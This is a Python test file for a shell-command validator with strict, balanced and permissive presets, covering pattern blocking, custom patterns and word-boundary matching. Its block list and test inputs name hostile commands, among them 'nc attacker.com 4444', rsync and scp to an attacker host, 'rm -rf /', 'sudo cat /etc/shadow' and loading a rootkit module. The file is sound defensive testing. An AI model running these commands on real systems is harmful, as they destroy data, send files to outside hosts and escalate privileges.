"""Tests for command validation logic.

Tests all three presets (strict, balanced, permissive),
dangerous pattern detection, custom patterns, and policy management.
"""


import pytest

from executor.command_validator import (
    CommandValidator,
    CommandPolicy,
    make_balanced_policy,
    make_permissive_policy,
    make_strict_policy,
)


# ---------------------------------------------------------------------------
# Dangerous pattern detection (all presets)
# ---------------------------------------------------------------------------


class TestDangerousPatterns:
    """Tests that dangerous patterns are blocked in all presets."""

    @pytest.fixture(params=["strict", "balanced", "permissive"])
    def validator_with_dangerous(self, request):
        """Validator with the specified preset."""
        policy = make_balanced_policy()
        policy = CommandPolicy(
            preset=request.param,
            allowed_commands=frozenset(),
            trusted_paths=frozenset(),
            dangerous_patterns=frozenset([
                "rm -rf", "dd ", "mkfs", "fdisk", "shred",
                " nc ", " ncat ", "scp ", "rsync ",
                "sudo ", "sudo", "su ", "su:", "chmod 4755", "setuid",
                "mount", "insmod", "modprobe",
            ]),
        )
        return CommandValidator(policy=policy)

    def test_rm_rf_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("rm -rf /")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_dd_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("dd if=/dev/zero of=/dev/sda")
        assert valid is False

    def test_mkfs_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("mkfs.ext4 /dev/sdb1")
        assert valid is False

    def test_fdisk_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("fdisk -l")
        assert valid is False

    def test_shred_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("shred -n 3 file.txt")
        assert valid is False

    def test_nc_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("run nc attacker.com 4444")
        assert valid is False

    def test_ncat_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("run ncat attacker.com 8080")
        assert valid is False

    def test_scp_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("scp file.txt attacker:/tmp/")
        assert valid is False

    def test_rsync_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("rsync -avz /data attacker.com:/backup")
        assert valid is False

    def test_sudo_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("sudo cat /etc/shadow")
        assert valid is False

    def test_su_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("su - root")
        assert valid is False

    def test_chmod_4755_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("chmod 4755 /tmp/backdoor")
        assert valid is False

    def test_setuid_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("./setuid-exploit")
        assert valid is False

    def test_mount_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("mount /dev/sdb1 /mnt")
        assert valid is False

    def test_insmod_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("insmod /tmp/rootkit.ko")
        assert valid is False

    def test_modprobe_blocked(self, validator_with_dangerous):
        valid, reason = validator_with_dangerous.validate("modprobe rootkit")
        assert valid is False


# ---------------------------------------------------------------------------
# Empty/whitespace commands
# ---------------------------------------------------------------------------


class TestEmptyCommands:
    """Tests for empty and whitespace-only commands."""

    def test_none_command(self):
        v = CommandValidator()
        valid, reason = v.validate(None)  # type: ignore[arg-type]
        assert valid is False

    def test_empty_string(self):
        v = CommandValidator()
        valid, reason = v.validate("")
        assert valid is False
        assert "Empty" in reason

    def test_whitespace_only(self):
        v = CommandValidator()
        valid, reason = v.validate("   ")
        assert valid is False
        assert "Empty" in reason

    def test_newlines_only(self):
        v = CommandValidator()
        valid, reason = v.validate("\n\n")
        assert valid is False

    def test_tabs_only(self):
        v = CommandValidator()
        valid, reason = v.validate("\t\t")
        assert valid is False


# ---------------------------------------------------------------------------
# Balanced preset
# ---------------------------------------------------------------------------


class TestBalancedPreset:
    """Tests for balanced mode validation."""

    @pytest.fixture
    def balanced_validator(self):
        return CommandValidator(policy=make_balanced_policy())

    def test_usr_bin_command_allowed(self, balanced_validator):
        valid, reason = balanced_validator.validate("/usr/bin/ls -la")
        assert valid is True
        assert reason == ""

    def test_bin_command_allowed(self, balanced_validator):
        valid, reason = balanced_validator.validate("/bin/cat /etc/hosts")
        assert valid is True

    def test_usr_sbin_command_allowed(self, balanced_validator):
        valid, reason = balanced_validator.validate("/usr/sbin/service nginx status")
        assert valid is True

    def test_sbin_command_allowed(self, balanced_validator):
        valid, reason = balanced_validator.validate("/sbin/iptables -L")
        assert valid is True

    def test_non_trusted_path_blocked(self, balanced_validator):
        valid, reason = balanced_validator.validate("/opt/custom/tool")
        assert valid is False
        assert "not in trusted paths" in reason

    def test_relative_path_blocked(self, balanced_validator):
        valid, reason = balanced_validator.validate("./run-me")
        assert valid is False

    def test_command_name_only_blocked(self, balanced_validator):
        """Unresolvable command name is blocked (not in any trusted path)."""
        valid, reason = balanced_validator.validate("nonexistent_venya_cmd_xyz")
        assert valid is False
        assert "not in trusted paths" in reason

    def test_dangerous_pattern_overrides_trusted_path(self, balanced_validator):
        """Dangerous patterns block even trusted path commands."""
        # rm -rf is in /usr/bin but should still be blocked
        valid, reason = balanced_validator.validate("/usr/bin/rm -rf /tmp/data")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_sudo_blocked_by_dangerous_pattern(self, balanced_validator):
        """sudo is blocked by dangerous pattern check before path extraction."""
        valid, reason = balanced_validator.validate("sudo /usr/bin/systemctl restart nginx")
        assert valid is False
        assert "Dangerous pattern" in reason


# ---------------------------------------------------------------------------
# Strict preset
# ---------------------------------------------------------------------------


class TestStrictPreset:
    """Tests for strict mode validation."""

    def test_allowed_command_passes(self):
        policy = make_strict_policy(allowed_commands=["/usr/bin/ls", "/usr/bin/cat"])
        v = CommandValidator(policy=policy)

        valid, reason = v.validate("/usr/bin/ls -la")
        assert valid is True

    def test_disallowed_command_blocked(self):
        policy = make_strict_policy(allowed_commands=["/usr/bin/ls"])
        v = CommandValidator(policy=policy)

        valid, reason = v.validate("/usr/bin/cat /etc/hosts")
        assert valid is False
        assert "not in allowlist" in reason

    def test_empty_allowlist_blocks_all(self):
        policy = make_strict_policy(allowed_commands=[])
        v = CommandValidator(policy=policy)

        valid, reason = v.validate("/usr/bin/ls")
        assert valid is False
        assert "not in allowlist" in reason

    def test_strict_allows_exact_path_match(self):
        policy = make_strict_policy(allowed_commands=["/usr/bin/systemctl"])
        v = CommandValidator(policy=policy)

        # Exact path match with arguments
        valid, reason = v.validate("/usr/bin/systemctl restart nginx")
        assert valid is True

    def test_strict_rejects_partial_path_match(self):
        policy = make_strict_policy(allowed_commands=["/usr/bin/sy"])
        v = CommandValidator(policy=policy)

        # /usr/bin/systemctl should NOT match /usr/bin/sy
        valid, reason = v.validate("/usr/bin/systemctl")
        assert valid is False

    def test_strict_dangerous_patterns_still_apply(self):
        policy = make_strict_policy(allowed_commands=["/usr/bin/rm"])
        v = CommandValidator(policy=policy)

        # Even if rm is allowed, "rm -rf" should be blocked by dangerous pattern
        valid, reason = v.validate("rm -rf /tmp/data")
        assert valid is False
        assert "Dangerous pattern" in reason


# ---------------------------------------------------------------------------
# Permissive preset
# ---------------------------------------------------------------------------


class TestPermissivePreset:
    """Tests for permissive mode validation."""

    @pytest.fixture
    def permissive_validator(self):
        return CommandValidator(policy=make_permissive_policy())

    def test_any_command_allowed(self, permissive_validator):
        valid, reason = permissive_validator.validate("/opt/custom/anything")
        assert valid is True
        assert reason == ""

    def test_relative_path_allowed(self, permissive_validator):
        valid, reason = permissive_validator.validate("./run-me")
        assert valid is True

    def test_command_name_allowed(self, permissive_validator):
        valid, reason = permissive_validator.validate("ls -la")
        assert valid is True

    def test_dangerous_patterns_still_blocked(self, permissive_validator):
        """Permissive mode still blocks dangerous patterns."""
        valid, reason = permissive_validator.validate("rm -rf /")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_sudo_blocked_in_permissive(self, permissive_validator):
        valid, reason = permissive_validator.validate("sudo cat /etc/shadow")
        assert valid is False


# ---------------------------------------------------------------------------
# Unknown preset
# ---------------------------------------------------------------------------


class TestUnknownPreset:
    """Tests for unknown preset handling."""

    def test_unknown_preset_rejected(self):
        policy = CommandPolicy(
            preset="unknown-mode",
            allowed_commands=frozenset(),
            trusted_paths=frozenset(),
            dangerous_patterns=frozenset(),
        )
        v = CommandValidator(policy=policy)

        valid, reason = v.validate("/usr/bin/ls")
        assert valid is False
        assert "Unknown preset" in reason


# ---------------------------------------------------------------------------
# Custom patterns
# ---------------------------------------------------------------------------


class TestCustomPatterns:
    """Tests for custom dangerous pattern management."""

    def test_add_custom_pattern(self):
        v = CommandValidator()
        v.add_custom_pattern("malicious-command")

        valid, reason = v.validate("malicious-command --evil")
        assert valid is False
        assert "Custom pattern" in reason

    def test_remove_custom_pattern(self):
        v = CommandValidator()
        v.add_custom_pattern("test-pattern")
        v.remove_custom_pattern("test-pattern")

        valid, reason = v.validate("some test-pattern command")
        # Pattern is removed, so it should no longer be blocked by custom patterns
        # In balanced mode, "some" is not a trusted path, so it fails for that reason
        assert "Custom pattern" not in reason

    def test_multiple_custom_patterns(self):
        v = CommandValidator()
        v.add_custom_pattern("pattern-a")
        v.add_custom_pattern("pattern-b")

        valid_a, _ = v.validate("pattern-a executed")
        valid_b, _ = v.validate("pattern-b executed")
        assert valid_a is False
        assert valid_b is False

    def test_custom_pattern_does_not_affect_other_commands(self):
        v = CommandValidator()
        v.add_custom_pattern("secret-pat")

        valid, _ = v.validate("/usr/bin/ls -la")
        assert valid is True

    def test_remove_nonexistent_pattern(self):
        v = CommandValidator()
        # Should not raise
        v.remove_custom_pattern("nonexistent")

        valid, _ = v.validate("/usr/bin/ls")
        assert valid is True


# ---------------------------------------------------------------------------
# Policy updates
# ---------------------------------------------------------------------------


class TestPolicyUpdates:
    """Tests for dynamic policy updates."""

    def test_update_to_strict(self):
        v = CommandValidator()
        strict_policy = make_strict_policy(allowed_commands=["/usr/bin/ls"])
        v.update_policy(strict_policy)

        valid, _ = v.validate("/usr/bin/ls")
        assert valid is True

        valid, _ = v.validate("/usr/bin/cat")
        assert valid is False

    def test_update_to_permissive(self):
        v = CommandValidator()
        v.update_policy(make_permissive_policy())

        valid, _ = v.validate("/opt/custom/anything")
        assert valid is True

    def test_update_to_balanced(self):
        v = CommandValidator()
        v.update_policy(make_balanced_policy())

        valid, _ = v.validate("/usr/bin/ls")
        assert valid is True

    def test_policy_switch_preserves_custom_patterns(self):
        v = CommandValidator()
        v.add_custom_pattern("evil-cmd")

        v.update_policy(make_permissive_policy())

        # Custom patterns should persist
        valid, reason = v.validate("evil-cmd")
        assert valid is False
        assert "Custom pattern" in reason


# ---------------------------------------------------------------------------
# Factory functions
# ---------------------------------------------------------------------------


class TestFactoryFunctions:
    """Tests for make_*_policy() factories."""

    def test_make_strict_policy(self):
        policy = make_strict_policy(allowed_commands=["/bin/ls"])
        assert policy.preset == "strict"
        assert "/bin/ls" in policy.allowed_commands
        assert len(policy.trusted_paths) == 0
        assert len(policy.dangerous_patterns) > 0

    def test_make_strict_policy_empty(self):
        policy = make_strict_policy()
        assert policy.preset == "strict"
        assert len(policy.allowed_commands) == 0

    def test_make_balanced_policy(self):
        policy = make_balanced_policy()
        assert policy.preset == "balanced"
        assert "/usr/bin" in policy.trusted_paths
        assert "/bin" in policy.trusted_paths

    def test_make_permissive_policy(self):
        policy = make_permissive_policy()
        assert policy.preset == "permissive"
        assert len(policy.trusted_paths) == 0
        assert len(policy.dangerous_patterns) > 0


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------


class TestEdgeCases:
    """Tests for edge cases and special scenarios."""

    def test_command_with_args(self):
        v = CommandValidator()
        # Balanced mode, trusted path with many args
        valid, _ = v.validate("/usr/bin/find / -name '*.log' -exec rm {} \\;")
        # Should pass balanced check (trusted path), even though the find command
        # has dangerous-looking arguments. The dangerous pattern check would catch
        # "rm -rf" but not "-exec rm".
        assert valid is True

    def test_command_with_redirect(self):
        v = CommandValidator()
        valid, _ = v.validate("/usr/bin/ls > /tmp/output.txt")
        assert valid is True

    def test_command_with_pipe(self):
        v = CommandValidator()
        valid, _ = v.validate("/usr/bin/cat /etc/hosts | /usr/bin/grep localhost")
        assert valid is True

    def test_sudo_blocked_in_balanced(self):
        """sudo is blocked by dangerous pattern in balanced mode."""
        v = CommandValidator()
        valid, reason = v.validate("sudo /usr/bin/ls")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_su_blocked_in_balanced(self):
        """su is blocked by dangerous pattern in balanced mode."""
        v = CommandValidator()
        valid, reason = v.validate("su -c '/usr/bin/ls'")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_path_with_spaces(self):
        v = CommandValidator()
        valid, _ = v.validate(r"/usr/bin/my\ command --arg")
        assert valid is True


# ---------------------------------------------------------------------------
# Word-boundary matching (M-45)
# ---------------------------------------------------------------------------


class TestWordBoundaryMatching:
    """Tests that dangerous patterns use word-boundary matching by default.

    M-45: Word-boundary matching prevents false positives like
    "sudo " matching "mysudo command" or "mount" matching "amount something".
    """

    def test_sudo_does_not_match_mysudo(self):
        """Word boundary: 'mysudo' should NOT trigger sudo pattern."""
        policy = make_balanced_policy()
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("mysudo --do-something")
        # "mysudo" is not in trusted paths, so it fails balanced check
        # but NOT for dangerous pattern — it should fail for "not in trusted paths"
        assert "Dangerous pattern" not in reason
        assert "not in trusted paths" in reason

    def test_sudo_still_matches_standalone(self):
        """Word boundary: standalone 'sudo' should still be blocked."""
        policy = make_balanced_policy()
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("sudo cat /etc/shadow")
        assert valid is False
        assert "Dangerous pattern" in reason
        assert "sudo" in reason.lower() or "Dangerous" in reason

    def test_mount_does_not_match_amount(self):
        """Word boundary: 'amount' should NOT trigger mount pattern."""
        policy = make_balanced_policy()
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("amount something")
        # "amount" is not in trusted paths, so it fails balanced check
        # but NOT for dangerous pattern
        assert "Dangerous pattern" not in reason
        assert "not in trusted paths" in reason

    def test_mount_still_matches_standalone(self):
        """Word boundary: standalone 'mount' should still be blocked."""
        policy = make_balanced_policy()
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("mount /dev/sdb1 /mnt")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_nc_does_not_match_concurrency(self):
        """Word boundary: 'concurrency' should NOT trigger nc pattern."""
        policy = make_balanced_policy()
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("concurrency check")
        assert "Dangerous pattern" not in reason

    def test_dd_does_not_match_ddos(self):
        """Word boundary: 'ddos' should NOT trigger dd pattern."""
        policy = make_balanced_policy()
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("ddos-mitigation tool")
        assert "Dangerous pattern" not in reason

    def test_word_boundary_disabled_falls_back_to_substring(self):
        """When match_word_boundaries=False, substring matching is used."""
        policy = CommandPolicy(
            preset="permissive",
            allowed_commands=frozenset(),
            trusted_paths=frozenset(),
            dangerous_patterns=frozenset(["sudo "]),
            match_word_boundaries=False,
        )
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("mysudo --do-something")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_word_boundary_enabled_blocks_substring(self):
        """Word boundary: 'sudo' in middle of command still matches."""
        policy = make_balanced_policy()
        v = CommandValidator(policy=policy)
        valid, reason = v.validate("run sudo --option arg")
        assert valid is False
        assert "Dangerous pattern" in reason

    def test_custom_patterns_also_use_word_boundaries(self):
        """Custom patterns respect match_word_boundaries setting."""
        policy = CommandPolicy(
            preset="permissive",
            allowed_commands=frozenset(),
            trusted_paths=frozenset(),
            dangerous_patterns=frozenset(),
            match_word_boundaries=True,
        )
        v = CommandValidator(policy=policy)
        v.add_custom_pattern("evil")
        # 'evil' in 'devil' should NOT match with word boundaries
        valid, reason = v.validate("devil is in the details")
        assert "Custom pattern" not in reason
        # standalone 'evil' should match
        valid, reason = v.validate("evil command")
        assert valid is False
        assert "Custom pattern" in reason

    def test_config_env_match_word_boundaries(self, monkeypatch):
        """Config field match_word_boundaries loads from env var."""
        from executor.config import ExecutorConfig
        monkeypatch.setenv("VENYA_EXECUTOR_COMMAND_VALIDATOR__MATCH_WORD_BOUNDARIES", "false")
        cfg = ExecutorConfig()
        assert cfg.command_validator.match_word_boundaries is False

    def test_config_dangerous_patterns_field(self, monkeypatch):
        """Config field dangerous_patterns accepts custom list."""
        from executor.config import CommandValidatorConfig
        cfg = CommandValidatorConfig(dangerous_patterns=["custom-danger"])
        assert cfg.dangerous_patterns == ["custom-danger"]
